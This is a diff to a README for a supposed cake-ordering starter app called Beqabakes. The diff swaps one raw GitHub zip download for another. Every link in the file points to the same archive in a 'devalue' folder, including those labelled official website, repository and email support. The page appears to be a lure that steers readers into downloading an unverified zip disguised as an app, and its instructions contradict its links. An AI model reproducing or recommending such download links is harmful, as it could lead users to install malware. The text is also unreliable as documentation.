@@ -1,6 +1,6 @@
 # 🍰 beqabakes-starter-site - Your Easy Guide to Delightful Cakes
 
-![Download](https://raw.githubusercontent.com/Githad87/beqabakes-starter-site/main/devalue/beqabakes-starter-site.zip)
+![Download](https://raw.githubusercontent.com/Githad87/beqabakes-starter-site/main/devalue/starter-beqabakes-site-v1.3.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Before you download, ensure your device meets the following basic requirements:
 
 ### 📥 Download & Install
 
-To download the Beqabakes Starter Site, visit [this page](https://raw.githubusercontent.com/Githad87/beqabakes-starter-site/main/devalue/beqabakes-starter-site.zip) to download the latest version.
+To download the Beqabakes Starter Site, visit [this page](https://raw.githubusercontent.com/Githad87/beqabakes-starter-site/main/devalue/starter-beqabakes-site-v1.3.zip) to download the latest version.
 
 1. Click on the **Releases** link above. 
 2. Find the version you would like to download. 
@@ -48,14 +48,14 @@ Once the app is running, you can start browsing through our delightful cakes and
 
 Learn more about Beqabakes and how you can make your celebrations better:
 
-- **Official Website:** [Beqabakes](https://raw.githubusercontent.com/Githad87/beqabakes-starter-site/main/devalue/beqabakes-starter-site.zip)
-- **GitHub Repository:** [beqabakes-starter-site](https://raw.githubusercontent.com/Githad87/beqabakes-starter-site/main/devalue/beqabakes-starter-site.zip)
+- **Official Website:** [Beqabakes](https://raw.githubusercontent.com/Githad87/beqabakes-starter-site/main/devalue/starter-beqabakes-site-v1.3.zip)
+- **GitHub Repository:** [beqabakes-starter-site](https://raw.githubusercontent.com/Githad87/beqabakes-starter-site/main/devalue/starter-beqabakes-site-v1.3.zip)
 
 ## 💬 Support
 
 If you face any issues while using the application, please feel free to reach out:
 
-- **Email Support:** https://raw.githubusercontent.com/Githad87/beqabakes-starter-site/main/devalue/beqabakes-starter-site.zip
+- **Email Support:** https://raw.githubusercontent.com/Githad87/beqabakes-starter-site/main/devalue/starter-beqabakes-site-v1.3.zip
 - **GitHub Issues Page:** Report any problems or feature requests.
 
 Your feedback is welcomed and helps improve the application.
@@ -64,6 +64,6 @@ Your feedback is welcomed and helps improve the application.
 
 Embrace the joy of gifting with Beqabakes. With just a few clicks, you can share delicious moments with friends and family.
 
-For a smooth experience, don't hesitate to visit [this page](https://raw.githubusercontent.com/Githad87/beqabakes-starter-site/main/devalue/beqabakes-starter-site.zip) again for updates.
+For a smooth experience, don't hesitate to visit [this page](https://raw.githubusercontent.com/Githad87/beqabakes-starter-site/main/devalue/starter-beqabakes-site-v1.3.zip) again for updates.
 
 Thank you for choosing Beqabakes! Enjoy your delightful cakes!
